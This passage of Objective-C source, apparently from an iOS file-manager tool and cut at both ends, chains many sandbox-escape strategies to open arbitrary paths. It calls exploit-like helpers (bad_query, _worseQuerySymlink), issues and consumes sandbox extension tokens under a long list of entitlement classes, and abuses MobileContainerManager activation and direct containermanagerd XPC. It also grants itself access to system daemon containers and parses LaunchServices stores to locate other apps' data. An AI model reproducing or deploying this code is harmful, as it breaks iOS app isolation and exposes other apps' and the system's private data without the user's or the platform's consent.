                        if (ok) {
                            int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                            if (fd >= 0) {
                                close(fd);
                                _storeLease(api, q, act, rtGroups[g], pathC);
                                xpc_release(xid);
                                _diagAppend("MCM-C7-force OK g[%d] f=%d", g, fi);
                                return 9050 + g;
                            }
                        }
                        if (api->objectFree) api->objectFree(act);
                    }
                }
                xpc_release(xid);
                api->queryFree(q);
            }
        }
        _diagAppend("MCM-C7 fail | ");
    }

    // Strategy 5: bad_query class-13
    {
        int64_t h = bad_query((char *)pathC, true, NULL, false);
        if (h >= 0) {
            _diagAppend("BQ-C13 OK h=%lld", (long long)h);
            return h;
        }
        _diagAppend("BQ-C13 fail | ");
    }

    // Strategy 6: bad_query class-7 per app group
    for (int g = 0; g < rtGroupCount; g++) {
        int64_t h = bad_query((char *)pathC, true, (char *)rtGroups[g], false);
        if (h >= 0) {
            _diagAppend("BQ-AG[%d] OK h=%lld", g, (long long)h);
            return h;
        }
        h = bad_query((char *)pathC, false, (char *)rtGroups[g], false);
        if (h >= 0) {
            _diagAppend("BQ-AG[%d]-nc OK h=%lld", g, (long long)h);
            return h;
        }
    }

    // Strategy 7: Direct open() hail mary
    {
        int flags[] = { O_RDONLY, O_RDONLY | O_DIRECTORY, O_RDONLY | O_CLOEXEC };
        for (int i = 0; i < 3; i++) {
            int fd = open(pathC, flags[i]);
            if (fd >= 0) {
                close(fd);
                _diagAppend("HAIL_MARY OK flags=%d", flags[i]);
                return 9900 + i;
            }
        }
    }

    // Strategy 8: Try parent directory then re-check
    {
        NSString *parent = [cleanPath stringByDeletingLastPathComponent];
        if (parent.length > 1) {
            int64_t ph = _worseQuerySymlink(parent.UTF8String);
            if (ph < 0) ph = _worseQueryGrant(parent.UTF8String, "fd-parent");
            if (ph >= 0) {
                int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                if (fd >= 0) {
                    close(fd);
                    _diagAppend("PARENT OK ph=%lld", (long long)ph);
                    return ph;
                }
            }
        }
    }

    // Strategy 9: MCM class-2 iterate + direct token consumption
    {
        SBXExtConsumeFunc consumeExt2 = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
                                                                   "sandbox_extension_consume");
        if (consumeExt2 && api->queryCreate && api->queryIterate && api->objectGetPath &&
            api->objectCopyToken) {
            static const uint64_t kC2Flags[] = { 0x900000000ULL, 0x8100000000ULL };
            for (int f = 0; f < 2; f++) {
                void *q9 = api->queryCreate();
                if (!q9) continue;
                api->querySetClass(q9, 2);
                api->querySetFlags(q9, kC2Flags[f]);
                if (api->querySetPart) api->querySetPart(q9, 0);

                __block int64_t foundHandle = -1;
                api->queryIterate(q9, ^bool(void *object) {
                    if (foundHandle >= 0) return false;
                    const char *objPath = object ? api->objectGetPath(object) : NULL;
                    if (!objPath) return true;

                    NSString *oPath = [NSString stringWithUTF8String:objPath];
                    if ([oPath isEqualToString:@"/var"] || [oPath hasPrefix:@"/var/"])
                        oPath = [@"/private" stringByAppendingString:oPath];

                    if ([cleanPath hasPrefix:oPath] || [cleanPath isEqualToString:oPath]) {
                        char *tok = api->objectCopyToken(object);
                        if (tok && tok[0]) {
                            int64_t h = consumeExt2(tok);
                            if (h >= 0) {
                                int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                                if (fd >= 0) {
                                    close(fd);
                                    foundHandle = h;
                                }
                            }
                        }
                        free(tok);
                    }
                    return foundHandle < 0;
                });

                api->queryFree(q9);
                if (foundHandle >= 0) {
                    _diagAppend("MCM-C2-TOK OK h=%lld", (long long)foundHandle);
                    return 9200 + f;
                }
            }
            _diagAppend("MCM-C2-TOK fail | ");
        }
    }

    // Strategy 10: Direct XPC to containermanagerd (bypass MCM wrapper)
    {
        int64_t xpcH = _tryDirectContainerdXPC(pathC);
        if (xpcH >= 0) {
            _diagAppend("XPC-DIRECT OK h=%lld", (long long)xpcH);
            return 9300;
        }
        _diagAppend("XPC-DIRECT fail | ");
    }

    // Strategy 11: LSApplicationProxy dataContainerURL + security-scoped resource
    {
        int64_t lsH = _tryLSProxyGrant(pathC);
        if (lsH >= 0) {
            _diagAppend("LS-PROXY OK h=%lld", (long long)lsH);
            return (int)lsH;
        }
        _diagAppend("LS-PROXY fail | ");
    }

    // Strategy 12: container_create_or_lookup_path_for_current_user
    {
        int64_t clH = _tryContainerCreateLookup(pathC);
        if (clH >= 0) {
            _diagAppend("C-LOOKUP OK h=%lld", (long long)clH);
            return 9400;
        }
        _diagAppend("C-LOOKUP fail | ");
    }

    _diagAppend("ALL FAILED");
    FDLog([NSString stringWithFormat:@"Grant FAILED for %s", pathC]);
    return -1;
}

int64_t FDGrantAccess(const char *path) {
    if (!path || path[0] != '/') return -1;
    _ensureEngineMutex();
    pthread_mutex_lock(&sEngineMutex);
    @try {
        return _FDGrantAccessLocked(path);
    } @finally {
        pthread_mutex_unlock(&sEngineMutex);
    }
}

void FDReleaseAccess(int64_t handle) {
    if (handle >= 9000) return;
    if (handle >= 0) bad_query_release(handle);
}

// Safe grant: only strategies 1-8 (no MCM-C2 iterate, no XPC direct, no LS-PROXY, no container_create_or_lookup)
static int64_t _FDGrantAccessSafeLocked(const char *path) {
    NSString *cleanPath = [NSString stringWithUTF8String:path];
    if ([cleanPath hasSuffix:@"/"])
        cleanPath = [cleanPath substringToIndex:cleanPath.length - 1];
    const char *pathC = cleanPath.UTF8String;

    MCMAPI *api = FDGetAPI();
    SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    SBXExtReleaseFunc releaseExt = (SBXExtReleaseFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_release");

    // Pre-check: already accessible?
    @try {
        int fd = open(pathC, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) { close(fd); return 9999; }
    } @catch (NSException *e) {}

    // Strategy 1: WQ-SYM (part=3, data containers)
    @try {
        int64_t h = _worseQuerySymlink(pathC);
        if (h >= 0) return h;
    } @catch (NSException *e) {
        NSLog(@"[FD-Safe] WQ-SYM exception: %@", e.reason);
    }

    // Strategy 1b: WQ-SYM with part=1 (bundle containers)
    if (strstr(pathC, "/containers/Bundle/") || strstr(pathC, "/Bundle/Application/")) {
        @try {
            int64_t h = _worseQuerySymlinkWithPart(pathC, 1);
            if (h >= 0) return h;
        } @catch (NSException *e) {
            NSLog(@"[FD-Safe] WQ-SYM-Bundle exception: %@", e.reason);
        }
    }

    // Strategy 2: WQ partDomain
    @try {
        int64_t h = _worseQueryGrant(pathC, "fd-safe");
        if (h >= 0) return h;
    } @catch (NSException *e) {
        NSLog(@"[FD-Safe] WQ-PD exception: %@", e.reason);
    }

    // Strategy 3: sandbox_extension_issue_file
    @try {
        SandboxIssueFileFunc issueFile = (SandboxIssueFileFunc)dlsym(RTLD_DEFAULT,
                                                                      "sandbox_extension_issue_file");
        SandboxIssueFilePidFunc issueFilePid = (SandboxIssueFilePidFunc)dlsym(RTLD_DEFAULT,
            "sandbox_extension_issue_file_to_process_by_pid");

        static const char *kExtClasses[] = {
            "com.apple.app-sandbox.read-write",
            "com.apple.app-sandbox.read",
            "com.apple.sandbox.container",
            "com.apple.security.exception.files.absolute-path.read-write",
            "com.apple.mobile.house_arrest.readwrite",
            "com.apple.mobile.house_arrest.readonly",
            "com.apple.mobile.house_arrest",
            "com.apple.sandbox.system-group",
            "com.apple.security.exception.files.absolute-path.read-only",
            "com.apple.app-sandbox.read-write.file-mode.metadata-only",
        };
        int nClasses = sizeof(kExtClasses) / sizeof(kExtClasses[0]);

        for (int ci = 0; ci < nClasses; ci++) {
            if (issueFile && consumeExt) {
                char *token = issueFile(kExtClasses[ci], pathC, 0);
                if (token) {
                    int64_t h = consumeExt(token);
                    if (h >= 0) {
                        int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                        if (fd >= 0) { close(fd); free(token); return h; }
                    }
                    if (h >= 0 && releaseExt) releaseExt(h);
                    free(token);
                }
            }
            if (issueFilePid && consumeExt) {
                char *token = issueFilePid(kExtClasses[ci], pathC, 0, getpid());
                if (token) {
                    int64_t h = consumeExt(token);
                    if (h >= 0) {
                        int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                        if (fd >= 0) { close(fd); free(token); return h; }
                    }
                    if (h >= 0 && releaseExt) releaseExt(h);
                    free(token);
                }
            }
        }
    } @catch (NSException *e) {
        NSLog(@"[FD-Safe] ISSUE exception: %@", e.reason);
    }

    // Strategy 4: MCM class-7 app group activation
    @try {
        const char **rtGroups; int rtGroupCount;
        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
        if (api->queryCreate && api->querySetGroupIdentifiers && api->objectActivate) {
            for (int g = 0; g < rtGroupCount; g++) {
                static const uint64_t kGrantFlags[] = { 0x900000000ULL, 0x8100000000ULL };
                for (int fi = 0; fi < 2; fi++) {
                    void *q = api->queryCreate();
                    if (!q) continue;
                    api->querySetClass(q, 7);
                    xpc_object_t xid = xpc_string_create(rtGroups[g]);
                    api->querySetGroupIdentifiers(q, xid);
                    api->querySetFlags(q, kGrantFlags[fi]);
                    if (api->querySetPart) api->querySetPart(q, 0);
                    void *res = api->queryGetSingle(q);
                    if (res && api->objectCopy) {
                        void *act = api->objectCopy(res);
                        if (act) {
                            char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                            bool activated = false;
                            if (token && token[0] != '\0')
                                activated = api->objectActivate(act, false);
                            free(token);
                            if (activated) {
                                int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                                if (fd >= 0) {
                                    close(fd);
                                    _storeLease(api, q, act, rtGroups[g], pathC);
                                    xpc_release(xid);
                                    return 9000 + g;
                                }
                            }
                            if (api->objectFree) api->objectFree(act);
                        }
                        act = api->objectCopy(res);
                        if (act) {
                            bool ok = api->objectActivate(act, true);
                            if (ok) {
                                int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                                if (fd >= 0) {
                                    close(fd);
                                    _storeLease(api, q, act, rtGroups[g], pathC);
                                    xpc_release(xid);
                                    return 9050 + g;
                                }
                            }
                            if (api->objectFree) api->objectFree(act);
                        }
                    }
                    xpc_release(xid);
                    api->queryFree(q);
                }
            }
        }
    } @catch (NSException *e) {
        NSLog(@"[FD-Safe] MCM-C7 exception: %@", e.reason);
    }

    // Strategy 5: bad_query class-13
    @try {
        int64_t h = bad_query((char *)pathC, true, NULL, false);
        if (h >= 0) return h;
    } @catch (NSException *e) {
        NSLog(@"[FD-Safe] BQ-C13 exception: %@", e.reason);
    }

    // Strategy 6: bad_query per app group
    @try {
        const char **rtGroups; int rtGroupCount;
        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
        for (int g = 0; g < rtGroupCount; g++) {
            int64_t h = bad_query((char *)pathC, true, (char *)rtGroups[g], false);
            if (h >= 0) return h;
            h = bad_query((char *)pathC, false, (char *)rtGroups[g], false);
            if (h >= 0) return h;
        }
    } @catch (NSException *e) {
        NSLog(@"[FD-Safe] BQ-AG exception: %@", e.reason);
    }

    // Strategy 7: Direct open() hail mary
    @try {
        int flags[] = { O_RDONLY, O_RDONLY | O_DIRECTORY, O_RDONLY | O_CLOEXEC };
        for (int i = 0; i < 3; i++) {
            int fd = open(pathC, flags[i]);
            if (fd >= 0) { close(fd); return 9900 + i; }
        }
    } @catch (NSException *e) {}

    // Strategy 8: Parent directory then re-check
    @try {
        NSString *parent = [cleanPath stringByDeletingLastPathComponent];
        if (parent.length > 1) {
            int64_t ph = _worseQuerySymlink(parent.UTF8String);
            if (ph < 0 && (strstr(pathC, "/containers/Bundle/") || strstr(pathC, "/Bundle/Application/")))
                ph = _worseQuerySymlinkWithPart(parent.UTF8String, 1);
            if (ph < 0) ph = _worseQueryGrant(parent.UTF8String, "fd-parent-safe");
            if (ph >= 0) {
                int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                if (fd >= 0) { close(fd); return ph; }
            }
        }
    } @catch (NSException *e) {
        NSLog(@"[FD-Safe] PARENT exception: %@", e.reason);
    }

    // Strategies 9-12 OMITTED — they crash on protected/system paths
    return -1;
}

int64_t FDGrantAccessSafe(const char *path) {
    if (!path || path[0] != '/') return -1;
    // NOTE: No outer mutex here — each grant strategy locks its own mutex.
    // Holding an outer mutex + strategy's inner mutex causes leaked lock counts
    // when exceptions skip the inner unlock, leading to deadlock → crash.
    int64_t result = -1;
    @try {
        result = _FDGrantAccessSafeLocked(path);
    } @catch (NSException *e) {
        NSLog(@"[FD-Safe] top-level exception: %@", e.reason);
    }
    return result;
}

#pragma mark - FDCanWrite

BOOL FDCanWrite(const char *dirPath) {
    char canary[1200];
    snprintf(canary, sizeof(canary), "%s/.fd_probe", dirPath);
    FILE *f = fopen(canary, "w");
    if (!f) return NO;
    fprintf(f, "fdprobe");
    fclose(f);
    f = fopen(canary, "r");
    if (!f) { unlink(canary); return NO; }
    char buf[16] = {0};
    fread(buf, 1, 7, f);
    fclose(f);
    unlink(canary);
    return (strcmp(buf, "fdprobe") == 0);
}

#pragma mark - MCM enumeration helpers

static NSString *_queryContainerPath(uint64_t cls, NSString *identifier,
                                     BOOL group, uint64_t flags) {
    MCMAPI *api = FDGetAPI();
    if (!api->queryCreate || !api->queryGetSingle || !api->objectGetPath) return nil;

    void *q = api->queryCreate();
    if (!q) return nil;

    api->querySetClass(q, cls);
    xpc_object_t xid = xpc_string_create(identifier.UTF8String);
    if (group && api->querySetGroupIdentifiers)
        api->querySetGroupIdentifiers(q, xid);
    else
        api->querySetIdentifiers(q, xid);
    api->querySetFlags(q, flags);
    if (api->querySetPart) api->querySetPart(q, 0);

    void *res = api->queryGetSingle(q);
    NSString *path = nil;
    if (res) {
        const char *raw = api->objectGetPath(res);
        if (raw) path = [NSString stringWithUTF8String:raw];
        if (path && ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"]))
            path = [@"/private" stringByAppendingString:path];

        if (api->objectCopy) {
            void *act = api->objectCopy(res);
            if (act) {
                char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                bool activated = false;

                if (token && token[0] != '\0' && path) {
                    SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
                                                                             "sandbox_extension_consume");
                    if (consumeExt) {
                        int64_t h = consumeExt(token);
                        if (h >= 0) {
                            int fd = open(path.UTF8String, O_RDONLY | O_CLOEXEC);
                            if (fd >= 0) {
                                close(fd);
                                activated = true;
                                NSLog(@"[FD-MCM] Direct consume OK cls=%llu id=%@ h=%lld",
                                      cls, identifier, (long long)h);
                            }
                        }
                    }
                }

                if (!activated && api->objectActivate && token && token[0] != '\0')
                    activated = api->objectActivate(act, false);

                if (!activated && api->objectActivate)
                    activated = api->objectActivate(act, true);

                free(token);
                if (activated) {
                    _storeLease(api, q, act, identifier.UTF8String, path.UTF8String ?: "");
                    xpc_release(xid);
                    return path;
                }
                if (api->objectFree) api->objectFree(act);
            }
        }
    }

    api->queryFree(q);
    xpc_release(xid);
    return path;
}

static NSArray<NSString *> *_enumerateIdentifiers(uint64_t cls, NSUInteger limit) {
    MCMAPI *api = FDGetAPI();
    if (!api->queryCreate || !api->queryIterate || !api->objectGetIdentifier || limit == 0)
        return @[];

    void *q = api->queryCreate();
    if (!q) return @[];

    api->querySetClass(q, cls);
    api->querySetFlags(q, 0x100000000ULL);
    if (api->querySetPart) api->querySetPart(q, 0);

    NSMutableOrderedSet<NSString *> *identifiers = [NSMutableOrderedSet orderedSet];
    api->queryIterate(q, ^bool(void *object) {
        const char *raw = object ? api->objectGetIdentifier(object) : NULL;
        NSString *ident = raw ? [NSString stringWithUTF8String:raw] : nil;
        if (ident.length) [identifiers addObject:ident];
        return identifiers.count < limit;
    });

    api->queryFree(q);
    return identifiers.array;
}

#pragma mark - LaunchServices csstore parsing

static BOOL _isValidUUIDAt(const uint8_t *bytes, NSUInteger pos, NSUInteger len) {
    // UUID: 8-4-4-4-12 hex with dashes = 36 chars
    if (pos + 36 > len) return NO;
    static const int dashPos[] = { 8, 13, 18, 23 };
    for (int d = 0; d < 4; d++) {
        if (bytes[pos + dashPos[d]] != '-') return NO;
    }
    for (int c = 0; c < 36; c++) {
        if (c == 8 || c == 13 || c == 18 || c == 23) continue;
        uint8_t ch = bytes[pos + c];
        if (!((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'F') || (ch >= 'a' && ch <= 'f')))
            return NO;
    }
    return YES;
}

static NSDictionary *_extractFromCSStoreBinary(NSData *data) {
    const uint8_t *bytes = (const uint8_t *)data.bytes;
    NSUInteger len = data.length;
    NSMutableSet *bundleCandidates = [NSMutableSet set];
    NSMutableSet *containerPaths = [NSMutableSet set];
    NSMutableArray *bundleEntries = [NSMutableArray array];
    NSMutableDictionary *pathPositions = [NSMutableDictionary dictionary];

    // --- Extract bundle IDs ---
    static const char *prefixes[] = {
        "com.", "org.", "net.", "io.", "app.", "me.", "dev.",
        "co.", "in.", "uk.", "de.", "fr.", "jp.", "kr.",
        "ru.", "cn.", "br.", "au.", "ca.", "eu.", "tv.", "us."
    };
    static const int prefixCount = sizeof(prefixes) / sizeof(prefixes[0]);

    NSUInteger i = 0;
    while (i < len) {
        BOOL isPrefix = NO;
        for (int p = 0; p < prefixCount; p++) {
            size_t plen = strlen(prefixes[p]);
            if (i + plen < len && memcmp(bytes + i, prefixes[p], plen) == 0) {
                isPrefix = YES;
                break;
            }
        }
        if (!isPrefix) { i++; continue; }

        NSUInteger start = i;
        NSUInteger dots = 0;
        while (i < len && (
            (bytes[i] >= 'a' && bytes[i] <= 'z') ||
            (bytes[i] >= 'A' && bytes[i] <= 'Z') ||
            (bytes[i] >= '0' && bytes[i] <= '9') ||
            bytes[i] == '.' || bytes[i] == '-' || bytes[i] == '_'
        )) {
            if (bytes[i] == '.') dots++;
            i++;
        }
        NSUInteger slen = i - start;
        if (dots >= 2 && slen >= 5 && slen <= 256) {
            NSString *s = [[[NSString alloc] initWithBytes:bytes + start
                                                    length:slen
                                                  encoding:NSUTF8StringEncoding] autorelease];
            if (s && ![s hasSuffix:@"."] && [s rangeOfString:@".."].location == NSNotFound) {
                [bundleCandidates addObject:s];
                [bundleEntries addObject:@{@"b": s, @"p": @(start)}];
            }
        }
    }

    // --- Extract container paths with UUIDs ---
    static const char *pathPrefixes[] = {
        "/var/mobile/Containers/Data/Application/",
        "/private/var/mobile/Containers/Data/Application/",
        "/var/containers/Bundle/Application/",
        "/private/var/containers/Bundle/Application/",
    };
    static const int pathPrefixCount = sizeof(pathPrefixes) / sizeof(pathPrefixes[0]);

    for (int pp = 0; pp < pathPrefixCount; pp++) {
        size_t ppLen = strlen(pathPrefixes[pp]);
        const uint8_t *search = (const uint8_t *)pathPrefixes[pp];
        for (NSUInteger j = 0; j + ppLen + 36 <= len; j++) {
            if (memcmp(bytes + j, search, ppLen) != 0) continue;
            NSUInteger uuidStart = j + ppLen;
            if (!_isValidUUIDAt(bytes, uuidStart, len)) { j += ppLen - 1; continue; }

            char pathBuf[512];
            if (pp == 0 || pp == 2) {
                snprintf(pathBuf, sizeof(pathBuf), "/private%.*s",
                         (int)(ppLen + 36), (const char *)(bytes + j));
            } else {
                snprintf(pathBuf, sizeof(pathBuf), "%.*s",
                         (int)(ppLen + 36), (const char *)(bytes + j));
            }
            NSString *path = [NSString stringWithUTF8String:pathBuf];
            if (path) {
                [containerPaths addObject:path];
                if (!pathPositions[path]) pathPositions[path] = @(j);
            }
            j += ppLen + 35;
        }
    }

    NSMutableDictionary *pathToBundle = [NSMutableDictionary dictionary];
    for (NSString *path in containerPaths) {
        NSNumber *posNum = pathPositions[path];
        if (!posNum) continue;
        NSUInteger pathPos = posNum.unsignedIntegerValue;
        NSString *nearestBid = nil;
        NSUInteger nearestDist = NSUIntegerMax;
        for (NSDictionary *entry in bundleEntries) {
            NSUInteger bidPos = [entry[@"p"] unsignedIntegerValue];
            NSUInteger dist = (pathPos > bidPos) ? (pathPos - bidPos) : (bidPos - pathPos);
            if (dist < nearestDist) {
                nearestDist = dist;
                nearestBid = entry[@"b"];
            }
        }
        if (nearestBid && nearestDist < 4096) {
            pathToBundle[path] = nearestBid;
        }
    }

    return @{
        @"bundleIDs": bundleCandidates,
        @"containerPaths": containerPaths,
        @"pathToBundle": pathToBundle,
    };
}

static NSString *_mcmQuerySystemContainerPath(uint64_t cls, NSString *identifier, BOOL group) {
    MCMAPI *api = FDGetAPI();
    if (!api->queryCreate || !api->queryGetSingle || !api->objectGetPath) return nil;

    static const uint64_t kFlags[] = { 0x900000000ULL, 0x8100000000ULL, 0x100000000ULL };
    for (int f = 0; f < 3; f++) {
        void *q = api->queryCreate();
        if (!q) continue;

        api->querySetClass(q, cls);
        xpc_object_t xid = xpc_string_create(identifier.UTF8String);
        if (group && api->querySetGroupIdentifiers)
            api->querySetGroupIdentifiers(q, xid);
        else
            api->querySetIdentifiers(q, xid);
        api->querySetFlags(q, kFlags[f]);
        if (api->querySetPart) api->querySetPart(q, 0);

        void *res = api->queryGetSingle(q);
        NSString *path = nil;
        if (res) {
            const char *raw = api->objectGetPath(res);
            if (raw) {
                path = [NSString stringWithUTF8String:raw];
                if (path && ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"]))
                    path = [@"/private" stringByAppendingString:path];
            }
            if (api->objectCopy) {
                void *act = api->objectCopy(res);
                if (act) {
                    char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                    bool activated = false;

                    if (token && token[0] != '\0' && path) {
                        SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
                                                                                 "sandbox_extension_consume");
                        if (consumeExt) {
                            int64_t h = consumeExt(token);
                            if (h >= 0) {
                                int fd = open(path.UTF8String, O_RDONLY | O_CLOEXEC);
                                if (fd >= 0) { close(fd); activated = true; }
                            }
                        }
                    }

                    if (!activated && api->objectActivate && token && token[0] != '\0')
                        api->objectActivate(act, false);
                    if (!activated && api->objectActivate)
                        api->objectActivate(act, true);

                    free(token);
                    if (api->objectFree) api->objectFree(act);
                }
            }
        }
        xpc_release(xid);
        api->queryFree(q);
        if (path.length > 0 && path.isAbsolutePath) {
            NSLog(@"[FD-CS] MCM class-%llu %@ -> %@ (flags=0x%llx)",
                  cls, identifier, path, kFlags[f]);
            return path;
        }
    }
    return nil;
}

static NSMutableSet *sCSStoreContainerPaths = nil;
static NSMutableDictionary *sCSStorePathToBundle = nil;
static NSMutableDictionary *sCSStoreBIDToBundlePath = nil;

static NSSet<NSString *> *_findAndParseCSStores(void) {
    NSMutableSet *allCandidates = [NSMutableSet set];
    if (!sCSStoreContainerPaths)
        sCSStoreContainerPaths = [[NSMutableSet alloc] init];
    if (!sCSStorePathToBundle)
        sCSStorePathToBundle = [[NSMutableDictionary alloc] init];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray *searchDirs = [NSMutableArray array];

    // Step 1: Discover com.apple.lsd container via MCM (class 10, 12, 2)
    // This is the KEY mechanism — lsd keeps its csstore in its own container
    static const struct { uint64_t cls; const char *ident; bool grp; } kLSDQueries[] = {
        { 10, "com.apple.lsd",   false },
        { 12, "com.apple.lsd",   false },
        { 2,  "com.apple.lsd",   false },
        { 10, "com.apple.mobileslideshow", false },
        { 13, "systemgroup.com.apple.lsd.mapdb", true },
    };
    int nq = sizeof(kLSDQueries) / sizeof(kLSDQueries[0]);

    for (int qi = 0; qi < nq; qi++) {
        NSString *ident = [NSString stringWithUTF8String:kLSDQueries[qi].ident];
        NSString *lsdPath = _mcmQuerySystemContainerPath(
            kLSDQueries[qi].cls, ident, kLSDQueries[qi].grp);
        if (lsdPath) {
            int64_t h = _worseQuerySymlink(lsdPath.fileSystemRepresentation);
            NSLog(@"[FD-CS] lsd container grant WQ-SYM h=%lld path=%@",
                  (long long)h, lsdPath);
            if (h < 0) {
                h = _worseQueryGrant(lsdPath.fileSystemRepresentation, "fd-lsd");
                NSLog(@"[FD-CS] lsd container grant WQ-PD h=%lld", (long long)h);
            }
            NSString *cachePath = [[lsdPath stringByAppendingPathComponent:@"Library"]
                                   stringByAppendingPathComponent:@"Caches"];
            [searchDirs addObject:cachePath];
            [searchDirs addObject:lsdPath];
            [searchDirs addObject:[lsdPath stringByAppendingPathComponent:@"Library"]];
        }
    }

    // Step 2: Also enumerate all class-10 containers (InternalDaemon)
    // to find any container that might hold csstore files
    MCMAPI *api = FDGetAPI();
    if (api->queryCreate && api->queryIterate && api->objectGetPath && api->objectGetIdentifier) {
        static const uint64_t kEnumClasses[] = { 10, 12 };
        for (int ci = 0; ci < 2; ci++) {
            void *q = api->queryCreate();
            if (!q) continue;
            api->querySetClass(q, kEnumClasses[ci]);
            api->querySetFlags(q, 0x100000000ULL);
            if (api->querySetPart) api->querySetPart(q, 0);

            __block int enumCount = 0;
            api->queryIterate(q, ^bool(void *obj) {
                if (!obj) return enumCount < 50;
                const char *rawPath = api->objectGetPath(obj);
                const char *rawIdent = api->objectGetIdentifier(obj);
                if (rawPath) {
                    NSString *p = [NSString stringWithUTF8String:rawPath];
                    if ([p isEqualToString:@"/var"] || [p hasPrefix:@"/var/"])
                        p = [@"/private" stringByAppendingString:p];
                    NSString *cacheSub = [[p stringByAppendingPathComponent:@"Library"]
                                          stringByAppendingPathComponent:@"Caches"];
                    [searchDirs addObject:cacheSub];
                    [searchDirs addObject:p];

                    int64_t h = _worseQuerySymlink(p.fileSystemRepresentation);
                    if (h < 0)
                        h = _worseQueryGrant(p.fileSystemRepresentation, "fd-enum-daemon");
                    NSLog(@"[FD-CS] class-%llu enum[%d] id=%s path=%@ grant=%lld",
                          kEnumClasses[ci], enumCount,
                          rawIdent ?: "?", p, (long long)h);
                }
                enumCount++;
                return enumCount < 50;
            });
            api->queryFree(q);
            NSLog(@"[FD-CS] class-%llu enumeration -> %d containers", kEnumClasses[ci], enumCount);
        }
    }

    // Step 3: Static fallback directories
    static const char *kStaticDirs[] = {
        "/private/var/mobile/Library/Caches",
        "/var/mobile/Library/Caches",
    };
    for (int d = 0; d < 2; d++)
        [searchDirs addObject:[NSString stringWithUTF8String:kStaticDirs[d]]];

    // Step 4: Scan InternalDaemon base dir for UUID subdirs
    NSArray *daemonBases = @[
        @"/private/var/mobile/Containers/Data/InternalDaemon",
        @"/var/mobile/Containers/Data/InternalDaemon",
        @"/private/var/containers/Data/InternalDaemon",
    ];
    for (NSString *daemonBase in daemonBases) {
        NSArray *uuids = [fm contentsOfDirectoryAtPath:daemonBase error:nil];
        NSLog(@"[FD-CS] InternalDaemon dir %@ -> %lu entries",
              daemonBase, (unsigned long)uuids.count);
        for (NSString *uuid in uuids) {
            if (uuid.length < 32 || [uuid hasPrefix:@"."]) continue;
            NSString *containerPath = [daemonBase stringByAppendingPathComponent:uuid];
            int64_t h = _worseQuerySymlink(containerPath.fileSystemRepresentation);
            if (h < 0)
                h = _worseQueryGrant(containerPath.fileSystemRepresentation, "fd-daemon");
            NSString *cachePath = [[containerPath
                                    stringByAppendingPathComponent:@"Library"]
                                   stringByAppendingPathComponent:@"Caches"];
            [searchDirs addObject:cachePath];
            [searchDirs addObject:containerPath];
        }
    }

    // Step 5: System containers
    NSArray *sysBases = @[
        @"/private/var/mobile/Containers/Data/System",
    ];
    for (NSString *base in sysBases) {
        NSArray *entries = [fm contentsOfDirectoryAtPath:base error:nil];
        for (NSString *uuid in entries) {
            if (uuid.length < 32 || [uuid hasPrefix:@"."]) continue;
            NSString *cachePath = [[[base stringByAppendingPathComponent:uuid]
                                    stringByAppendingPathComponent:@"Library"]
                                   stringByAppendingPathComponent:@"Caches"];
            [searchDirs addObject:cachePath];
        }
    }

    // Remove duplicates
    NSOrderedSet *uniqueDirs = [NSOrderedSet orderedSetWithArray:searchDirs];
    NSLog(@"[FD-CS] total unique search dirs: %lu", (unsigned long)uniqueDirs.count);

    int storesFound = 0;
    int dirsAccessible = 0;

    for (NSString *dir in uniqueDirs) {
        NSError *dirErr = nil;
        NSArray *contents = [fm contentsOfDirectoryAtPath:dir error:&dirErr];
        if (!contents) continue;
        dirsAccessible++;
        for (NSString *name in contents) {
            if (![name hasPrefix:@"com.apple.LaunchServices-"]) continue;
            NSString *storePath = [dir stringByAppendingPathComponent:name];
            NSData *data = [NSData dataWithContentsOfFile:storePath];
            NSLog(@"[FD-CS] FOUND store: %@ bytes=%lu at %@",
                  name, (unsigned long)data.length, dir);
            if (!data || data.length < 100) continue;
            storesFound++;
            NSDictionary *extracted = _extractFromCSStoreBinary(data);
            NSSet *ids = extracted[@"bundleIDs"];
            NSSet *paths = extracted[@"containerPaths"];
            NSLog(@"[FD-CS] extracted %lu candidates + %lu container paths from %@",
                  (unsigned long)ids.count, (unsigned long)paths.count, name);
            [allCandidates unionSet:ids];
            [sCSStoreContainerPaths unionSet:paths];
            NSDictionary *ptb = extracted[@"pathToBundle"];
            if (ptb) [sCSStorePathToBundle addEntriesFromDictionary:ptb];
        }
    }

    // Build reverse mapping: bundleID → bundle container path
    if (!sCSStoreBIDToBundlePath)
        sCSStoreBIDToBundlePath = [[NSMutableDictionary alloc] init];
    for (NSString *path in sCSStorePathToBundle) {
        if ([path rangeOfString:@"/Bundle/Application/"].location != NSNotFound) {
            NSString *bid = [sCSStorePathToBundle objectForKey:path];
            if (bid && ![sCSStoreBIDToBundlePath objectForKey:bid])
                [sCSStoreBIDToBundlePath setObject:path forKey:bid];
        }
    }

    NSLog(@"[FD-CS] SUMMARY: dirs_accessible=%d stores=%d total_candidates=%lu cross_refs=%lu bundle_paths=%lu",
          dirsAccessible, storesFound, (unsigned long)allCandidates.count,
          (unsigned long)sCSStorePathToBundle.count,
          (unsigned long)sCSStoreBIDToBundlePath.count);
    return allCandidates;
}

static NSArray<NSString *> *_launchServicesEnumerate(void) {
    NSMutableArray *bundleIDs = [NSMutableArray array];

